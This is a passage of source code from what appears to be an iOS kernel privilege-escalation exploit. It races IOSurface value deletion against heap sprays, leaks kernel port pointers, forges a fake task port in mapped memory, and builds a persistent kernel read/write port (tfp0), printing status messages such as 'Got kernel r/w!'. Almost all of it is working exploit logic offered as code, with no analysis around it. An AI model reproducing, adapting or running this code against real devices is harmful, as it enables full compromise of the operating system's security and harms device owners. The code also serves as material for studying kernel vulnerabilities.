        pthread_attr_set_qos_class_np(&attr, QOS_CLASS_BACKGROUND, -3);
        for (int i=0; i<SPINTHREADCNT; i++){
            pthread_create(&spinthreads[i], &attr, spinner, &keepSpinning);
        }
        while (donethreads<SPINTHREADCNT) sched_yield();
        
        keepSpinning = 1;
        donethreads = 0;
        donespray = 0;
        
        pthread_attr_set_qos_class_np(&attr, anakinQOS, anakinQOSOffset);
        
        for (int i=0; i<ANAKINTHREADCNT; i++) {
            pthread_create(&anakins[i], &attr, anakin, (void*)&anakinIds[i]);
        }
        while (anakinRacer<ANAKINTHREADCNT) sched_yield();

        pthread_attr_set_qos_class_np(&attr, sprayQOS, sprayQOSOffset);

        for (int i=0; i<MIN_THREADS; i++) {
            pthread_create(&spraythreads[i], &attr, sSprayWorker, praydata[i]);
        }

        while (donethreads<MIN_THREADS) sched_yield();
        
        checkAnakins = false;
        while (donespray<MIN_SPRAY) sched_yield();
        
        checkAnakins = true;
        
        for (int i=MIN_THREADS; i<SPRAYTHREADS; i++) {
            pthread_create(&spraythreads[i], &attr, sSprayWorker, praydata[i]);
        }
        

        anakinSyn = 1;
        
        
        for (int i=0; i<SPRAYTHREADS; i++) {
            pthread_join(spraythreads[i], NULL);
        }
        
        anakinSyn = 0;

        for (int i=0; i<ANAKINTHREADCNT; i++) {
            pthread_join(anakins[i], NULL);
        }

        donethreads = 0;
        
        keepSpinning = 0;
        for (int i = 0; i<SPINTHREADCNT; i++){
            pthread_join(spinthreads[i], NULL);
        }

        resume_all_threads();
        
        
        dprintf(outFd, "[i] scanning...\n");
        
        findbufs(praydata, SPRAYTHREADS);
        
        // -- END HAX --
        safeFree(praydata);
    }
    

    if ((leaked_port_ptr && goverlapsIDs.size() < 1) || goverlapsIDs.size() < 2) {
        if (++trycounter > REDO_SPRAY_ATTEMPTS) {
            dprintf(errFd, "[-] too many failed tries, this is bad\n");
            goto error;
        }
        dprintf(errFd, "[-] not enough overlappings, retry...!\n");
        usleep(200 * 1000);
        goto redospray;
    }
    

    if ((leaked_port_ptr && goverlapsIDs.size() < 1) || goverlapsIDs.size() < 2) {
        dprintf(errFd, "exploit failed!\n");
        assure(0);
    }
    
    dprintf(outFd, "Overlaps: \n");
    for (std::pair<uint32_t, uint32_t> overlap : goverlapsIDs){
        dprintf(outFd, "overlap: %d %d\n", overlap.first, overlap.second);
    }
    dprintf(outFd, "=========================\n");
    

    if (!leaked_port_ptr) {
        leakShared = goverlapsIDs.at(0);
        goverlapsIDs.erase(goverlapsIDs.begin());
        trigger_request[0] = surface_data_id[0];
        trigger_request[2] = leakShared.first;

        assure(IOServiceOpen(graphics_service, mach_task_self(), 2, &graphics_shared_client) == KERN_SUCCESS);
        assure(MACH_PORT_VALID(graphics_shared_client));

        assure(IOServiceOpen(graphics_service, mach_task_self(), 0, &graphics_client) == KERN_SUCCESS);
        assure(MACH_PORT_VALID(graphics_client));
        
        {
            suspend_all_threads();
            dprintf(outFd, "[i] leaking shared port ptr...\n");
            kern_return_t ret = 0;
            kern_return_t ret2 = 0;
            size_t rsp_sz = 4;
            size_t response = 0;
            
            
            for (int i=0; i<0x10000; i++); //put this thread on high performance core!
            sched_yield();
            ret = IOConnectCallStructMethod(client, IOSURFACE_DELETE_VALUE, trigger_request, 0x10, &response, &rsp_sz);
            ret2 = IOConnectAddClient(graphics_client, graphics_shared_client);
            
            resume_all_threads();
            
            if (ret) {
                dprintf(errFd, "[-] delete err=%d str=%s\n",ret,mach_error_string(ret));
                goto error;
            }

            if (ret2) {
                dprintf(errFd, "[-] IOConnectAddClient err=%d str=%s\n",ret2,mach_error_string(ret2));
                goto error;
            }
        }

        //leak ptr
        trigger_request[2] = leakShared.second;
        {
            typedef struct{
                uint64_t pad1;
                uint64_t pad2;
                uint64_t port[2];
            } __attribute__((packed)) t_sprayelement;
            t_sprayelement response;
            size_t rsp_sz = sizeof(t_sprayelement);

            
            if ((ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, trigger_request, sizeof(trigger_request), &response, &rsp_sz))){
                dprintf(errFd, "[-] error ret = %d\n",ret);
                goto error;
            }
            
            if (response.port[1] != kern_page_size*2) {
                dprintf(errFd, "[-] exploit failed: bad port recieved (leaked_port_ptr).\n");
                goto redospray;
            }
            leaked_port_ptr = response.port[0];
        }
    }
    
    

    spray_port_ptr = leaked_port_ptr+0x20;
    dprintf(outFd, "[+] leaked_port_ptr=%p\n",(void*)leaked_port_ptr);
    
    dprintf(outFd, "[i] mach port prespray...\n");
    prespray_ports = (mach_port_t*)malloc(sizeof(mach_port_t)*MACH_SPRAYTHREADS);
    for (int i=0; i<MACH_SPRAYTHREADS; i++) {
        assure(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &prespray_ports[i]) == 0);
        assure(mach_port_insert_right(mach_task_self(), prespray_ports[i], prespray_ports[i], MACH_MSG_TYPE_MAKE_SEND) == 0);
    }
    
    praydata = (void **)malloc(MACH_SPRAYTHREADS*sizeof(void*));
    
    for (int i=0; i<MACH_SPRAYTHREADS; i++) {
        praydata[i] = getMachSprayData(prespray_ports[i]);
    }

    anakinSyn = 0;
    donethreads = 0;
    
    if (!real_port_ptr) {
        leakPort = goverlapsIDs.at(0);
        goverlapsIDs.erase(goverlapsIDs.begin());
        
        trigger_request[0] = surface_data_id[0];
        trigger_request[2] = leakPort.first;

        dprintf(outFd, "[i] leaking mach port ptr...\n");
        suspend_all_threads();
        
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_set_qos_class_np(&attr, QOS_CLASS_USER_INTERACTIVE, -1);
        pthread_create(&trigger_thread, &attr, overlapReleaseWorker, trigger_request);

        for (int i=0; i<MACH_SPRAYTHREADS; i++) {
            pthread_create(&machspraythreads[i], &attr, mSprayWorker, praydata[i]);
        }

        while (donethreads<MACH_SPRAYTHREADS) sched_yield();
        
        anakinSyn = 1;
        
        pthread_join(trigger_thread, NULL);
        
        for (int i=0; i<MACH_SPRAYTHREADS; i++) {
            pthread_join(spraythreads[i], NULL);
        }
        
        for (int i=0; i<MACH_SPRAYTHREADS; i++) {
            free(praydata[i]);
        }
        safeFree(praydata);
        
        resume_all_threads();
        
        //do some leak ptr verification
        trigger_request[2] = leakPort.second;
        {
            
            typedef struct{
                uint64_t pad1;
                uint64_t pad2;
                uint64_t port[2];
            } __attribute__((packed)) t_sprayelement;
            t_sprayelement response;
            size_t rsp_sz = sizeof(t_sprayelement);

            
            if ((ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, trigger_request, sizeof(trigger_request), &response, &rsp_sz))){
                dprintf(errFd, "[-] error ret = %d\n",ret);
                goto error;
            }
            
            if (response.port[0] || !response.port[1]) {
                dprintf(errFd, "[-] exploit failed: bad port recieved (real_port_ptr).\n"); //possibly recoverable?
                goto redospray;
            }
            real_port_ptr = response.port[1];
            dprintf(outFd, "[+] port verify success! (%p)\n",(void*)real_port_ptr);
        }
    }
    


    //spray port ptrs
    dprintf(outFd, "[i] spraying fake port ptr %p ...\n",(void*)spray_port_ptr);

    praydata = (void **)malloc(SPRAYTHREADS*sizeof(void*));
    
    for (int i=0; i<SPRAYTHREADS; i++) {
        praydata[i] = getSprayData2(surface_data_id[0], DATA_CNT, &sprayDictSize, &sprayID, spray_port_ptr);
    }
    
    trigger_request[0] = surface_data_id[0];
    trigger_request[2] = leakPort.second;

    
    {
        uint32_t dummy = 0;

        kern_return_t ret = 0;
        kern_return_t retf = 0;
        size_t rsp_sz = 4;
        size_t response = 0;
            
        suspend_all_threads();
        
        for (int i=0; i<0x10000; i++);//put this thread on high performance core!
        sched_yield();
        ret = IOConnectCallStructMethod(client, IOSURFACE_DELETE_VALUE, trigger_request, 0x10, &response, &rsp_sz);
        
        for (int i=0; i<SPRAYTHREADS; i++) {
            size_t size = sizeof(dummy);
            retf = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, praydata[i], sprayDictSize, &dummy, &size);
            if (retf) {
                dprintf(errFd, "[-] failed to spray memory err=%d str=%s\n",retf,mach_error_string(retf));
            }
        }
        
        resume_all_threads();
        
        if (ret){
            dprintf(errFd, "[-] delete error ret = %d\n",ret);
            goto error;
        }
    }
    

    for (int i=0; i<SPRAYTHREADS; i++) {
        free(praydata[i]);
    }
    safeFree(praydata);
    
    dprintf(outFd, "[i] Mapping memory...\n");
    
    //sleep(1);
    
    {
        mach_vm_size_t size = 0;
        assure(!(ret = IOConnectMapMemory64(graphics_client, 0, mach_task_self(), &fakePortAddr, &size, 1)));
    }
    
    {
        uint8_t *kportPage = (uint8_t*)fakePortAddr;
        bzero(kportPage, kern_page_size*2);
        
        kport_t kport ={
            .ip_bits = 0x80000002 | 0x00000800, // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK | IO_BITS_KOBJECT
            .ip_references = 100,
            .ip_lock ={
                .type = 0x11,
            },
            .ip_messages ={
                .port ={
                    .receiver_name = 1,
                    .msgcount = 0,
                    .qlimit = 1,
                    .waitq = {
                        .flags = mach_port_waitq_flags()
                    }
                },
            },
            .ip_srights = 99,
            .ip_kobject = spray_port_ptr+0x1000
        };
        
        *(kport_t*)&kportPage[0x20] = kport;
        kportPage[0x16] = 42;//the answer to everything :D

#warning TODO fix for other stuff
        ktask_t ktask = {
            .a = {
                .ref_count = 2,
                .lock = {
                    .data = 0,
                    .type = 0x22
                },
                .active = 1
            }
        };
        
        kportPage[kern_page_size + 0x16] = task_zone;
        *(ktask_t*)&kportPage[0x1000 + 0x20] = ktask;
        *(ktask_t*)&kportPage[kern_page_size + 0x20] = ktask;
    }
    
    
    //recv msg
    dprintf(outFd, "[i] getting fakeport...\n");
    
    for (int i=0; i<MACH_SPRAYTHREADS; i++) {
        Request stuff = {0};
        Request *OutP = &stuff;
        OutP->Head.msgh_size = sizeof(mach_msg_header_t)+sizeof(mach_msg_body_t)+sizeof(mach_msg_ool_ports_descriptor_t)+0x38;
        ret = mach_msg(&OutP->Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT,0, OutP->Head.msgh_size, prespray_ports[i], 5, 0);
                
        if (ret) {
            dprintf(errFd, "err=%d str=%s\n",ret,mach_error_string(ret));
            continue;
        }
        
        #define recv_port_fake (((mach_port_t*)(OutP->memdesc.address))[0])
        #define recv_port_real (((mach_port_t*)(OutP->memdesc.address))[1])

        if (recv_port_real) {
            mach_port_destroy(mach_task_self(), recv_port_real);
        }else{
            fakePort = recv_port_fake;
        }
        ret = vm_deallocate(mach_task_self(), (vm_address_t)OutP->desc.address, PAGE_SIZE);
        if (ret) {
            dprintf(errFd, "failed to dealloc memory! err=%d str=%s\n",ret,mach_error_string(ret));
        }
    }
    
    if (!fakePort) {
        dprintf(errFd, "Exploit failed: didn't get fakeport\n");
        assure(0);
    }

    dprintf(outFd, "[+] Got fakeport!\n");
    
    //sleep(1);
    
    {
        mach_port_insert_right(mach_task_self(), fakePort, fakePort, MACH_MSG_TYPE_MAKE_SEND);

        uint64_t destination = kread64_via_pid_for_task(real_port_ptr + OFFSET_IPCPORT_IP_RECEIVER);
        uint64_t receiver = kread64_via_pid_for_task(destination + OFFSET_IPCPORT_IP_RECEIVER);
        our_task = kread64_via_pid_for_task(receiver + OFFSET_IPC_SPACE_IS_TASK);
        
        uint64_t client_addr = findPort(client, kread64_via_pid_for_task);
        ipc_space_kernel = kread64_via_pid_for_task(client_addr + OFFSET_IPCPORT_IP_RECEIVER);
        
        uint64_t our_proc = kread64_via_pid_for_task(our_task + OFFSET_TASK_BSD_INFO);
        
        uint32_t our_pid = kread32_via_pid_for_task(our_proc + OFFSET_PROC_PID);
        dprintf(outFd, "our_pid=%d %d\n", getpid(), our_pid);
        
        uint64_t kernproc = our_proc;
        while (kernproc){
            int pid = kread32_via_pid_for_task(kernproc + OFFSET_PROC_PID);
            if (pid == 0){
                break;
            }
            kernproc = kread64_via_pid_for_task(kernproc + OFFSET_PROC_NEXT);
        }
        
        kerntask = kread64_via_pid_for_task(kernproc + OFFSET_PROC_TASK);
        
        uint64_t kernmap = kread64_via_pid_for_task(kerntask + OFFSET_TASK_MAP);
        kread32_via_pid_for_task(leaked_port_ptr + 0x4000 + 0x16);
        
        uint8_t *kportPage = (uint8_t*)fakePortAddr;
        kport_t *kport = (kport_t *)&kportPage[0x20];
        
        uint32_t *ktaskBuf = (uint32_t *)&kportPage[kern_page_size + 0x20];
        ktask_t *ktask = (ktask_t *)ktaskBuf;
        
        kport->ip_kobject = spray_port_ptr + 0x4000;
        kport->ip_receiver = ipc_space_kernel;
        ktask->a.map = kernmap;
        ktask->b.itk_self = 1;
        
        tfp0 = fakePort;
        dprintf(outFd, "[+] Got kernel r/w!\n");
    }
    
    {
        //build a safer tfp0
        uint64_t tfp0_page = kalloc_via_tfp0(kern_page_size);
        kwrite_via_tfp0(tfp0_page + 0x16, &task_zone, sizeof(uint32_t));
        
        uint64_t fake_task = tfp0_page + 0x100;
        
        void *ktask_buf = malloc(0xf00);
        kread_via_tfp0(kerntask, ktask_buf, 0xf00);
        kwrite_via_tfp0(fake_task, ktask_buf, 0xf00);
        
        mach_port_t newPort = MACH_PORT_NULL;
        ret = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &newPort);
        if (ret){
            dprintf(errFd, "unable to allocate mach port: %s\n", mach_error_string(ret));
            goto error;
        }
        
        uint64_t our_ipc_space = rk64_via_tfp0(our_task + OFFSET_TASK_ITK_SPACE);
        uint64_t is_table = rk64_via_tfp0(our_ipc_space + OFFSET_IPC_SPACE_IS_TABLE);
        uint64_t portIdx = newPort >> 8;
        
        uint64_t portAddr = findPort(newPort, rk64_via_tfp0);
        
        wk32_via_tfp0(portAddr + OFFSET_IPC_PORT_IO_BITS, 0x80000002 | 0x00000800); // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK | IO_BITS_KOBJECT
        wk32_via_tfp0(portAddr + OFFSET_IPC_PORT_IO_REFERENCES, 0xf00d);
        wk32_via_tfp0(portAddr + OFFSET_IPC_PORT_IP_SRIGHTS, 0xf00d);
        wk64_via_tfp0(portAddr + OFFSET_IPC_PORT_IP_RECEIVER, ipc_space_kernel);
        wk64_via_tfp0(portAddr + OFFSET_IPC_PORT_IP_KOBJECT, fake_task);
        
        //swap our receive right for a send right
        
        uint64_t bits_addr = is_table + (portIdx * IPC_ENTRY_SZ) + OFFSET_IPC_ENTRY_IE_BITS;
        uint32_t bits = rk32_via_tfp0(bits_addr);
        
        bits &= (~IE_BITS_RECEIVE);
        bits |= IE_BITS_SEND;
        
        wk32_via_tfp0(bits_addr, bits);
        
        tfp0 = newPort;
        dprintf(outFd, "[+] Built safer tfp0!\n");
        
        ret = mach_port_destroy(mach_task_self_, fakePort);
        if (ret){
            dprintf(outFd, "unable to destroy unsafe mach port: %s\n", mach_error_string(ret));
            goto error;
        }
    }
    
    dprintf(outFd, "[+] Cleaning Up\n");
    
    freebufs(surface_data_id[0]);
    
error:
    if (err) {
        dprintf(errFd, "error=%d\n",err);
        sleep(5);
        exit(1);
    }
    safeFree(prespray_ports);
    safeFree(praydata);
    
    uint64_t surface_id_in = early_surface_id;
    ret = IOConnectCallScalarMethod(client, IOSURFACE_RELEASE_SURFACE, &surface_id_in, 1, NULL, NULL);
    if (ret){
        dprintf(errFd, "Unable to release surface: %s\n", mach_error_string(ret));
    }
        
    if (graphics_shared_client){
        IOServiceClose(graphics_shared_client);
        graphics_shared_client = MACH_PORT_NULL;
    }
    if (graphics_client){
        IOServiceClose(graphics_client);
        graphics_client = MACH_PORT_NULL;
    }
    
    /*if (client){
        IOServiceClose(client);
        client = MACH_PORT_NULL;
    }*/ //uncomment for panic
    
    if (service){
        IOObjectRelease(service);
        service = MACH_PORT_NULL;
    }
    if (graphics_service){
        IOObjectRelease(graphics_service);
        graphics_service = MACH_PORT_NULL;
    }
    
    if (MACH_PORT_VALID(tfp0)){
        uint64_t entry = dumpClients();
        
        dprintf(outFd, "Leaking client...\n");
        
        uint64_t taskqueue = our_task + OFFSET_TASK_IO_USER_CLIENTS;
        uint64_t next = rk64_via_tfp0(entry + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_NEXT);
        uint64_t prev = rk64_via_tfp0(entry + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_PREV);
        
        if (taskqueue == next){
            wk64_via_tfp0(taskqueue + QUEUE_PREV, prev);
        } else {
            wk64_via_tfp0(next + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_PREV, prev);
        }
        
        if (taskqueue == prev){
            wk64_via_tfp0(taskqueue + QUEUE_NEXT, next);
        } else {
            wk64_via_tfp0(prev + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_PREV, next);
        }
        
        wk64_via_tfp0(entry + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_NEXT, 0);
        wk64_via_tfp0(entry + OFFSET_IOUSERCLIENTOWNER_TASKLINK + QUEUE_PREV, 0);
        
        uint64_t clientAddr = findPort(client, rk64_via_tfp0);
        wk64_via_tfp0(clientAddr + OFFSET_IPC_PORT_IP_KOBJECT, 0);
        
        mach_port_deallocate(mach_task_self_, client);
    
        dprintf(outFd, "[+] exploit succeeded!\n");
    } else {
        dprintf(errFd, "[-] exploit failed!\n");
    }
    return err;
}
